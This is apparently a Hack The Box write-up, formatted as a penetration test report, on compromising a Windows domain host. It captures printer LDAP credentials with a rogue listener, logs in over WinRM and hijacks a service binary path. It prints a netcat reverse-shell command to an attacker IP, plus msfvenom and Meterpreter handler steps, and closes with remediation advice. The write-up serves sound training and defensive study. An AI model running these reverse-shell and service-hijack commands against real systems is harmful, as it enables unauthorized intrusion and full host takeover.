# Penetration Test Report — Return

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-printer%20LDAP%20%2F%20Server%20Operators-red)

## Executive Summary

An authorized assessment of `target.htb` abused a network printer administration panel whose LDAP settings allowed the server address to be redefined. Pointing it at an attacker-controlled listener captured the cleartext credentials of the `svc-printer` service account, enabling WinRM access. The account's membership in the **Server Operators** group permitted modification of a system service binary path, producing a reverse shell as `NT AUTHORITY\SYSTEM` — full host compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Printer admin panel allowing LDAP server redirection → credential capture | High |
| 2 | Service account (`svc-printer`) with interactive WinRM access | Medium |
| 3 | Server Operators membership → service binary path hijack | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC target.htb
```

IIS (80), SMB (445), WinRM (5985). enum4linux placed the host in the `RETURN` domain; SMB refused NULL sessions. Port 80 hosted a **printer admin panel**; its Settings page displayed an LDAP username and domain.

### 2. Foothold — Capturing Printer LDAP Credentials

Enterprise printers store LDAP credentials to query Active Directory. The panel allowed changing the LDAP *server address*. A listener was started and the target pointed at it:

```bash
sudo nc -lvnp 389
```

The printer connected and transmitted the **cleartext** credentials of `svc-printer`: `1edFg43012!!`.

```bash
gem install evil-winrm
evil-winrm -i target.htb -u svc-printer -p '1edFg43012!!'
```

User flag recovered.

### 3. Privilege Escalation — Server Operators

Group enumeration showed `svc-printer` ∈ **Server Operators** — members can start/stop/reconfigure services. The VSS service binary path was hijacked:

```powershell
upload /usr/share/windows-resources/binaries/nc.exe
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <attacker-ip> 1234"
sc.exe stop vss
sc.exe start vss
```

A reverse shell as SYSTEM was caught (short-lived). For a stable session, a Meterpreter payload was used instead:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=1337 -f exe > shellx86.exe
```

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 1337
run
```

```powershell
sc.exe config vss binPath="C:\Users\svc-printer\Desktop\shell.exe"
sc.exe stop vss
sc.exe start vss
```

Then migrated to a stable SYSTEM process:

```
meterpreter > ps
meterpreter > migrate <PID_of_SYSTEM_process>
meterpreter > shell
```

Root flag obtained.

## Remediation

- Restrict printer admin panels to management VLANs; disable credential reconfiguration by unauthenticated users; prefer TLS-protected LDAP (LDAPS) andKerberos.
- Remove WinRM rights from service accounts where unnecessary.
- Audit Server Operators membership — it is effectively local admin; monitor service binary-path changes (Event ID 7045/4697).

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Credential Access | T1040 — Network Sniffing (rogue LDAP listener) |
| Initial Access | T1078 — Valid Accounts |
| Privilege Escalation | T1543.003 — Windows Service (binPath hijack) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
